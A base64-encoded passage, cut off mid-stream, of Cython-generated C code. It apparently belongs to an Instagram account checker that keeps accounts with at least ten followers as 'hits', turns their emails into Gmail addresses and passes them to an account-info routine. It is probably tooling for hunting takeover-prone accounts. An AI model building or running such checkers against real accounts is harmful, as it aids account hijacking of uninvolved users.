KICAgICAgICAKICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3Zfc2VsZiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2luZm9pbnN0YSk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDE1OSwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgICAgICAgX19weXhfdF80ID0gKF9fUHl4X1B5U2VxdWVuY2VfQ29udGFpbnNURihfX3B5eF92X3VzZXJuYW1lLCBfX3B5eF90XzUsIFB5X0VRKSk7IGlmICh1bmxpa2VseSgoX19weXhfdF80IDwgMCkpKSBfX1BZWF9FUlIoMCwgMTU5LCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgICBpZiAoX19weXhfdF80KSB7CgogICAgICAgICAgCiAgICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3Zfc2VsZiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2luZm9pbnN0YSk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDE2MSwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgICAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5T2JqZWN0X0dldEl0ZW0oX19weXhfdF81LCBfX3B5eF92X3VzZXJuYW1lKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMTYxLCBfX3B5eF9MM19lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dldCk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDE2MSwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICAgICAgX19weXhfdF82ID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzZdLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMTYxLCBfX3B5eF9MM19lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CgogICAgICAgICAgCiAgICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU51bWJlcl9JbnQoX19weXhfdF82KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTYwLCBfX3B5eF9MM19lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgICAgICBfX3B5eF92X2ZvbGxvd2VyX2NvdW50ID0gKChQeU9iamVjdCopX19weXhfdF81KTsKICAgICAgICAgIF9fcHl4X3RfNSA9IDA7CgogICAgICAgICAgCiAgICAgICAgICBfX3B5eF90XzUgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF92X2ZvbGxvd2VyX2NvdW50LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMTAsIFB5X0dFKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAxNjIsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNSk7IGlmICh1bmxpa2VseSgoX19weXhfdF80IDwgMCkpKSBfX1BZWF9FUlIoMCwgMTYyLCBfX3B5eF9MM19lcnJvcikKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICAgICAgaWYgKF9fcHl4X3RfNCkgewoKICAgICAgICAgICAgCiAgICAgICAgICAgIF9fcHl4X3RfNiA9IF9fcHl4X3Zfc2VsZjsKICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNik7CiAgICAgICAgICAgIF9fcHl4X3RfMTMgPSAwOwogICAgICAgICAgICB7CiAgICAgICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2hpdHN9OwogICAgICAgICAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9pbmNyZW1lbnRfY291bnRlciwgX19weXhfY2FsbGFyZ3MrX19weXhfdF8xMywgKDItX19weXhfdF8xMykgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTYzLCBfX3B5eF9MM19lcnJvcikKICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgICAgICAgICAgfQogICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKCiAgICAgICAgICAgIAogICAgICAgICAgICBfX3B5eF90XzQgPSAoX19QeXhfUHlTZXF1ZW5jZV9Db250YWluc1RGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzcsIF9fcHl4X3Zfb3JpZ2luYWxfZW1haWwsIFB5X05FKSk7IGlmICh1bmxpa2VseSgoX19weXhfdF80IDwgMCkpKSBfX1BZWF9FUlIoMCwgMTY0LCBfX3B5eF9MM19lcnJvcikKICAgICAgICAgICAgaWYgKF9fcHl4X3RfNCkgewoKICAgICAgICAgICAgICAKICAgICAgICAgICAgICBfX3B5eF90XzUgPSBQeU51bWJlcl9BZGQoX19weXhfdl9vcmlnaW5hbF9lbWFpbCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9nbWFpbF9jb20pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAxNjUsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogICAgICAgICAgICAgIF9fcHl4X3Zfb2sgPSBfX3B5eF90XzU7CiAgICAgICAgICAgICAgX19weXhfdF81ID0gMDsKCiAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgX19weXhfdF82ID0gX19weXhfdl9vazsKICAgICAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF82KTsKICAgICAgICAgICAgICBfX3B5eF90XzEzID0gMDsKICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X183fTsKICAgICAgICAgICAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zcGxpdCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF8xMywgKDItX19weXhfdF8xMykgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDE2NiwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgaWYgKChsaWtlbHkoUHlUdXBsZV9DaGVja0V4YWN0KF9fcHl4X3RfNSkpKSB8fCAoUHlMaXN0X0NoZWNrRXhhY3QoX19weXhfdF81KSkpIHsKICAgICAgICAgICAgICAgIFB5T2JqZWN0KiBzZXF1ZW5jZSA9IF9fcHl4X3RfNTsKICAgICAgICAgICAgICAgIFB5X3NzaXplX3Qgc2l6ZSA9IF9fUHl4X1B5U2VxdWVuY2VfU0laRShzZXF1ZW5jZSk7CiAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoc2l6ZSAhPSAyKSkgewogICAgICAgICAgICAgICAgICBpZiAoc2l6ZSA+IDIpIF9fUHl4X1JhaXNlVG9vTWFueVZhbHVlc0Vycm9yKDIpOwogICAgICAgICAgICAgICAgICBlbHNlIGlmIChzaXplID49IDApIF9fUHl4X1JhaXNlTmVlZE1vcmVWYWx1ZXNFcnJvcihzaXplKTsKICAgICAgICAgICAgICAgICAgX19QWVhfRVJSKDAsIDE2NiwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiAhQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMKICAgICAgICAgICAgICAgIGlmIChsaWtlbHkoUHlUdXBsZV9DaGVja0V4YWN0KHNlcXVlbmNlKSkpIHsKICAgICAgICAgICAgICAgICAgX19weXhfdF82ID0gUHlUdXBsZV9HRVRfSVRFTShzZXF1ZW5jZSwgMCk7CiAgICAgICAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzYpOwogICAgICAgICAgICAgICAgICBfX3B5eF90XzExID0gUHlUdXBsZV9HRVRfSVRFTShzZXF1ZW5jZSwgMSk7CiAgICAgICAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzExKTsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5TGlzdF9HZXRJdGVtUmVmKHNlcXVlbmNlLCAwKTsKICAgICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMTY2LCBfX3B5eF9MM19lcnJvcikKICAgICAgICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzYpOwogICAgICAgICAgICAgICAgICBfX3B5eF90XzExID0gX19QeXhfUHlMaXN0X0dldEl0ZW1SZWYoc2VxdWVuY2UsIDEpOwogICAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTEpKSBfX1BZWF9FUlIoMCwgMTY2LCBfX3B5eF9MM19lcnJvcikKICAgICAgICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzExKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICNlbHNlCiAgICAgICAgICAgICAgICBfX3B5eF90XzYgPSBfX1B5eF9QeVNlcXVlbmNlX0lURU0oc2VxdWVuY2UsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAxNjYsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgICAgICAgICAgICAgICBfX3B5eF90XzExID0gX19QeXhfUHlTZXF1ZW5jZV9JVEVNKHNlcXVlbmNlLCAxKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzExKSkgX19QWVhfRVJSKDAsIDE2NiwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMSk7CiAgICAgICAgICAgICAgICAjZW5kaWYKICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBQeV9zc2l6ZV90IGluZGV4ID0gLTE7CiAgICAgICAgICAgICAgICBfX3B5eF90XzEyID0gUHlPYmplY3RfR2V0SXRlcihfX3B5eF90XzUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTIpKSBfX1BZWF9FUlIoMCwgMTY2LCBfX3B5eF9MM19lcnJvcikKICAgICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEyKTsKICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICAgICAgICAgICAgX19weXhfdF8yMiA9IChDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJKSA/IFB5SXRlcl9OZXh0IDogX19QeXhfUHlPYmplY3RfR2V0SXRlck5leHRGdW5jKF9fcHl4X3RfMTIpOwogICAgICAgICAgICAgICAgaW5kZXggPSAwOyBfX3B5eF90XzYgPSBfX3B5eF90XzIyKF9fcHl4X3RfMTIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIGdvdG8gX19weXhfTDU2X3VucGFja2luZ19mYWlsZWQ7CiAgICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgICAgICAgICAgIGluZGV4ID0gMTsgX19weXhfdF8xMSA9IF9fcHl4X3RfMjIoX19weXhfdF8xMik7IGlmICh1bmxpa2VseSghX19weXhfdF8xMSkpIGdvdG8gX19weXhfTDU2X3VucGFja2luZ19mYWlsZWQ7CiAgICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMSk7CiAgICAgICAgICAgICAgICBpZiAoX19QeXhfSXRlcm5leHRVbnBhY2tFbmRDaGVjayhfX3B5eF90XzIyKF9fcHl4X3RfMTIpLCAyKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE2NiwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgICAgICAgICBfX3B5eF90XzIyID0gTlVMTDsKICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEyKTsgX19weXhfdF8xMiA9IDA7CiAgICAgICAgICAgICAgICBnb3RvIF9fcHl4X0w1N191bnBhY2tpbmdfZG9uZTsKICAgICAgICAgICAgICAgIF9fcHl4X0w1Nl91bnBhY2tpbmdfZmFpbGVkOjsKICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEyKTsgX19weXhfdF8xMiA9IDA7CiAgICAgICAgICAgICAgICBfX3B5eF90XzIyID0gTlVMTDsKICAgICAgICAgICAgICAgIGlmIChfX1B5eF9JdGVyRmluaXNoKCkgPT0gMCkgX19QeXhfUmFpc2VOZWVkTW9yZVZhbHVlc0Vycm9yKGluZGV4KTsKICAgICAgICAgICAgICAgIF9fUFlYX0VSUigwLCAxNjYsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgICAgICAgICAgX19weXhfTDU3X3VucGFja2luZ19kb25lOjsKICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF92X3VzZXJuYW1lLCBfX3B5eF90XzYpOwogICAgICAgICAgICAgIF9fcHl4X3RfNiA9IDA7CiAgICAgICAgICAgICAgX19weXhfdl9nZyA9IF9fcHl4X3RfMTE7CiAgICAgICAgICAgICAgX19weXhfdF8xMSA9IDA7CgogICAgICAgICAgICAgIAogICAgICAgICAgICAgIF9fcHl4X3RfMTEgPSBfX3B5eF92X3NlbGY7CiAgICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMTEpOwogICAgICAgICAgICAgIF9fcHl4X3RfMTMgPSAwOwogICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1szXSA9IHtfX3B5eF90XzExLCBfX3B5eF92X3VzZXJuYW1lLCBfX3B5eF92X2dnfTsKICAgICAgICAgICAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9JbmZvQWNjLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzEzLCAoMy1fX3B5eF90XzEzKSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7CiAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAxNjcsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgICAgICAgICAgICAgfQogICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwoKICAgICAgICAgICAgICAKICAgICAgICAgICAgICBnb3RvIF9fcHl4X0w1NTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgCiAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgX19weXhfdF8xMSA9IF9fcHl4X3Zfb3JpZ2luYWxfZW1haWw7CiAgICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMTEpOwogICAgICAgICAgICAgIF9fcHl4X3RfMTMgPSAwOwogICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzExLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X183fTsKICAgICAgICAgICAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zcGxpdCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF8xMywgKDItX19weXhfdF8xMykgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwOwogICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTY5LCBfX3B5eF9MM19lcnJvcikKICAgICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogICAgICAgICAgICAgIH0KICAgICAgICAgICAgICBpZiAoKGxpa2VseShQeVR1cGxlX0NoZWNrRXhhY3QoX19weXhfdF81KSkpIHx8IChQeUxpc3RfQ2hlY2tFeGFjdChfX3B5eF90XzUpKSkgewogICAgICAgICAgICAgICAgUHlPYmplY3QqIHNlcXVlbmNlID0gX19weXhfdF81OwogICAgICAgICAgICAgICAgUHlfc3NpemVfdCBzaXplID0gX19QeXhfUHlTZXF1ZW5jZV9TSVpFKHNlcXVlbmNlKTsKICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseShzaXplICE9IDIpKSB7CiAgICAgICAgICAgICAgICAgIGlmIChzaXplID4gMikgX19QeXhfUmFpc2VUb29NYW55VmFsdWVzRXJyb3IoMik7CiAgICAgICAgICAgICAgICAgIGVsc2UgaWYgKHNpemUgPj0gMCkgX19QeXhfUmFpc2VOZWVkTW9yZVZhbHVlc0Vycm9yKHNpemUpOwogICAgICAgICAgICAgICAgICBfX1BZWF9FUlIoMCwgMTY5LCBfX3B5eF9MM19lcnJvcikKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICNpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmICFDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUwogICAgICAgICAgICAgICAgaWYgKGxpa2VseShQeVR1cGxlX0NoZWNrRXhhY3Qoc2VxdWVuY2UpKSkgewogICAgICAgICAgICAgICAgICBfX3B5eF90XzExID0gUHlUdXBsZV9HRVRfSVRFTShzZXF1ZW5jZSwgMCk7CiAgICAgICAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzExKTsKICAgICAgICAgICAgICAgICAgX19weXhfdF82ID0gUHlUdXBsZV9HRVRfSVRFTShzZXF1ZW5jZSwgMSk7CiAgICAgICAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzYpOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgX19weXhfdF8xMSA9IF9fUHl4X1B5TGlzdF9HZXRJdGVtUmVmKHNlcXVlbmNlLCAwKTsKICAgICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzExKSkgX19QWVhfRVJSKDAsIDE2OSwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xMSk7CiAgICAgICAgICAgICAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5TGlzdF9HZXRJdGVtUmVmKHNlcXVlbmNlLCAxKTsKICAgICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMTY5LCBfX3B5eF9MM19lcnJvcikKICAgICAgICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzYpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgI2Vsc2UKICAgICAgICAgICAgICAgIF9fcHl4X3RfMTEgPSBfX1B5eF9QeVNlcXVlbmNlX0lURU0oc2VxdWVuY2UsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTEpKSBfX1BZWF9FUlIoMCwgMTY5LCBfX3B5eF9MM19lcnJvcikKICAgICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzExKTsKICAgICAgICAgICAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5U2VxdWVuY2VfSVRFTShzZXF1ZW5jZSwgMSk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDE2OSwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgICAgICAgICAgICNlbmRpZgogICAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIFB5X3NzaXplX3QgaW5kZXggPSAtMTsKICAgICAgICAgICAgICAgIF9fcHl4X3RfMTIgPSBQeU9iamVjdF9HZXRJdGVyKF9fcHl4X3RfNSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMikpIF9fUFlYX0VSUigwLCAxNjksIF9fcHl4X0wzX2Vycm9yKQogICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTIpOwogICAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgICAgICAgICAgICBfX3B5eF90XzIyID0gKENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkpID8gUHlJdGVyX05leHQgOiBfX1B5eF9QeU9iamVjdF9HZXRJdGVyTmV4dEZ1bmMoX19weXhfdF8xMik7CiAgICAgICAgICAgICAgICBpbmRleCA9IDA7IF9fcHl4X3RfMTEgPSBfX3B5eF90XzIyKF9fcHl4X3RfMTIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTEpKSBnb3RvIF9fcHl4X0w1OF91bnBhY2tpbmdfZmFpbGVkOwogICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTEpOwogICAgICAgICAgICAgICAgaW5kZXggPSAxOyBfX3B5eF90XzYgPSBfX3B5eF90XzIyKF9fcHl4X3RfMTIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIGdvdG8gX19weXhfTDU4X3VucGFja2luZ19mYWlsZWQ7CiAgICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgICAgICAgICAgIGlmIChfX1B5eF9JdGVybmV4dFVucGFja0VuZENoZWNrKF9fcHl4X3RfMjIoX19weXhfdF8xMiksIDIpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTY5LCBfX3B5eF9MM19lcnJvcikKICAgICAgICAgICAgICAgIF9fcHl4X3RfMjIgPSBOVUxMOwogICAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDsKICAgICAgICAgICAgICAgIGdvdG8gX19weXhfTDU5X3VucGFja2luZ19kb25lOwogICAgICAgICAgICAgICAgX19weXhfTDU4X3VucGFja2luZ19mYWlsZWQ6OwogICAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDsKICAgICAgICAgICAgICAgIF9fcHl4X3RfMjIgPSBOVUxMOwogICAgICAgICAgICAgICAgaWYgKF9fUHl4X0l0ZXJGaW5pc2goKSA9PSAwKSBfX1B5eF9SYWlzZU5lZWRNb3JlVmFsdWVzRXJyb3IoaW5kZXgpOwogICAgICAgICAgICAgICAgX19QWVhfRVJSKDAsIDE2OSwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgICAgICAgICBfX3B5eF9MNTlfdW5wYWNraW5nX2RvbmU6OwogICAgICAgICAgICAgIH0KICAgICAgICAgICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3ZfdXNlcm5hbWUsIF9fcHl4X3RfMTEpOwogICAgICAgICAgICAgIF9fcHl4X3RfMTEgPSAwOwogICAgICAgICAgICAgIF9fcHl4X3ZfZ2cgPSBfX3B5eF90XzY7CiAgICAgICAgICAgICAgX19weXhfdF82ID0gMDsKCiAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgX19weXhfdF82ID0gX19weXhfdl9zZWxmOwogICAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzYpOwogICAgICAgICAgICAgIF9fcHl4X3RfMTMgPSAwOwogICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1szXSA9IHtfX3B5eF90XzYsIF9fcHl4X3ZfdXNlcm5hbWUsIF9fcHl4X3ZfZ2d9OwogICAgICAgICAgICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0luZm9BY2MsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfMTMsICgzLV9fcHl4X3RfMTMpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAxNzAsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgICAgICAgICAgICAgfQogICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICAgICAgICB9CiAgICAgICAgICAgIF9fcHl4X0w1NTo7CgogICAgICAgICAgICAKICAgICAgICAgICAgZ290byBfX3B5eF9MNTQ7CiAgICAgICAgICB9CgogICAgICAgICAgCiAgICAgICAgICAgewogICAgICAgICAgICBfX3B5eF90XzYgPSBfX3B5eF92X3NlbGY7CiAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzYpOwogICAgICAgICAgICBfX3B5eF90XzEzID0gMDsKICAgICAgICAgICAgewogICAgICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9maWx0ZXJlZH07CiAgICAgICAgICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2luY3JlbW